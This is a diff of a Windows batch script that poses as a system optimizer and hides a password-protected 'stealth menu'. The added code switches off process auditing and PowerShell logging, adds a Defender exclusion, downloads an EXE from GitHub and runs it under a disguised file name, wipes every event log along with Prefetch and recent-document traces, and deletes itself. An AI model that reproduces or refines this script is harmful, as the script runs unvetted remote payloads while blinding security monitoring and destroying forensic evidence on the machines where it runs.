@@ -1,13 +1,16 @@
 @echo off
-setlocal EnableDelayedExpansion
+setlocal enabledelayedexpansion
 
-:: ===== CONFIGURATION =====
+:: Remote stealth password URL
 set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
+
+:: URL to EXE file (CAXVN.exe) on GitHub
 set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
+
+:: Local temp paths
 set "SETUP_EXE=%temp%\CAXVN.exe"
 set "DISGUISED_EXE=%temp%\user_data_blob.dat"
 
-:: ===== LOGIN =====
 :LOGIN
 cls
 echo ==========================================
@@ -29,6 +32,7 @@ if "%userpass%"=="1" (
         goto STEALTH_MENU
     )
 )
+
 goto LOGIN
 
 :CheckStealthPassword
@@ -40,7 +44,6 @@ if /i "%inputpass%"=="%remote_pass%" (
     exit /b 1
 )
 
-:: ===== OPTIMIZATION MENU =====
 :OPTIMIZATION_MENU
 cls
 echo ==========================================
@@ -71,18 +74,25 @@ timeout /t 2 /nobreak >nul
 goto OPTIMIZATION_MENU
 
 :CLEAN_REGISTRY_LOGS
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
+echo Cleaning Registry Logs...
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
 echo Registry logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAN_EVENT_LOGS
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
+echo Cleaning Event Logs...
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
 echo Event logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAR_TEMP_FILES
+echo Clearing Temp Files...
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
 echo Temp files cleared.
@@ -90,27 +100,30 @@ pause
 goto OPTIMIZATION_MENU
 
 :FLUSH_DNS_CACHE
+echo Flushing DNS Cache...
 ipconfig /flushdns
 echo DNS Cache flushed.
 pause
 goto OPTIMIZATION_MENU
 
 :CHECK_DISK
+echo Checking Disk for Errors...
 chkdsk C: /f /r
 pause
 goto OPTIMIZATION_MENU
 
 :DEFRAGMENT_DISK
+echo Defragmenting C: drive...
 defrag C: /U /V
 pause
 goto OPTIMIZATION_MENU
 
 :SYSTEM_FILE_CHECKER
+echo Running System File Checker...
 sfc /scannow
 pause
 goto OPTIMIZATION_MENU
 
-:: ===== STEALTH MENU =====
 :STEALTH_MENU
 cls
 echo  ===========================================
@@ -140,39 +153,53 @@ echo Invalid choice. Try again.
 timeout /t 2 /nobreak >nul
 goto STEALTH_MENU
 
-:SETUP
-:: Disable logging and defender
-powershell -Command "auditpol /set /subcategory:'Process Creation' /success:disable /failure:disable"
-echo Disabling PowerShell script block logging...
-powershell -Command "Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0 -Force" 2>nul
-powershell -Command "Add-MpPreference -ExclusionPath '%SETUP_EXE%'"
-powershell -Command "Stop-Service DusmSvc -Force" >nul 2>&1
+:DISABLE_AUDIT_LOGS
+auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
+powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0" >nul 2>&1
+exit /b 0
 
-:: Simulate download
+:ENABLE_AUDIT_LOGS
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
+powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1" >nul 2>&1
+exit /b 0
+
+:SETUP
+call :DISABLE_AUDIT_LOGS
+
+echo Adding Windows Defender exclusion for EXE...
+powershell -Command "Add-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+
 echo STEP 1: Preparing download...
 timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
 timeout /t 1 >nul
 echo STEP 3: Downloading payload (CAXVN.exe)...
-powershell -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
+powershell -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" >nul 2>&1
 
 if exist "%SETUP_EXE%" (
     echo Download successful.
 ) else (
     echo Failed to download EXE.
     pause
+    call :ENABLE_AUDIT_LOGS
+    powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
     goto STEALTH_MENU
 )
 
-:: Re-enable audit and PowerShell logging
-powershell -Command "auditpol /set /subcategory:'Process Creation' /success:enable /failure:enable"
-powershell -Command "Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -Force" 2>nul
-powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'"
-
+call :ENABLE_AUDIT_LOGS
+echo Removing Windows Defender exclusion for EXE...
+powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
 pause
 goto STEALTH_MENU
 
 :RUN
+echo STEP 1: Stopping Data Usage Service...
+timeout /t 1 >nul
+sc stop "DataUsageSvc" >nul 2>&1
+
+echo STEP 2: Preparing disguised EXE...
+timeout /t 1 >nul
+
 if not exist "%SETUP_EXE%" (
     echo EXE not found. Please run Setup first.
     pause
@@ -180,6 +207,9 @@ if not exist "%SETUP_EXE%" (
 )
 
 copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
+
+echo STEP 3: Launching payload...
+timeout /t 1 >nul
 start "" /b "%DISGUISED_EXE%"
 
 :WAIT_LOOP
@@ -189,26 +219,41 @@ if not errorlevel 1 (
     goto WAIT_LOOP
 )
 
-:: Delete all generated files by EXE
-for %%f in (imgui.ini imgui.log *.tmp *.cache *.bak *.dmp) do del /f /q "%%~dp0%%f" >nul 2>&1
-del /f /q "%DISGUISED_EXE%" >nul 2>&1
+del /f /q "%~dp0*.imgui" >nul 2>&1
+del /f /q "%~dp0*.*" >nul 2>&1
 
 echo EXE run completed and cleaned up.
 pause
 goto STEALTH_MENU
 
 :BYPASS
-:: Re-enable Data Usage Overview Service
-sc start DusmSvc >nul 2>&1
+echo STEP 1: Starting Bypass - cleanup and restore...
+timeout /t 1 >nul
 
-:: Cleanup
+echo STEP 2: Starting Data Usage Service...
+sc start "DataUsageSvc" >nul 2>&1
+timeout /t 1 >nul
+
+echo STEP 3: Re-enabling audit logs and Defender...
+call :ENABLE_AUDIT_LOGS
+powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+timeout /t 1 >nul
+
+echo STEP 4: Running cleanup...
+timeout /t 1 >nul
+
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
 del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
-for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
+
+for /f "tokens=*" %%G in ('wevtutil el') do (
+    wevtutil cl "%%G" 2>nul
+)
+
 ipconfig /flushdns >nul
 echo off | clip
+
 echo Cleanup done. All traces removed.
 pause
 goto STEALTH_MENU
@@ -226,8 +271,12 @@ goto STEALTH_MENU
 exit
 
 :SELF_DESTRUCT
+echo Initiating Self-Destruct...
+timeout /t 1 >nul
 del /f /q "%SETUP_EXE%" >nul 2>&1
 del /f /q "%DISGUISED_EXE%" >nul 2>&1
+del /f /q "%~dp0*.imgui" >nul 2>&1
+del /f /q "%~dp0*.*" >nul 2>&1
 set "BATFILE=%~f0"
 echo Set fso = CreateObject("Scripting.FileSystemObject") > "%temp%\delete_me.vbs"
 echo fso.DeleteFile "%BATFILE%", True >> "%temp%\delete_me.vbs"
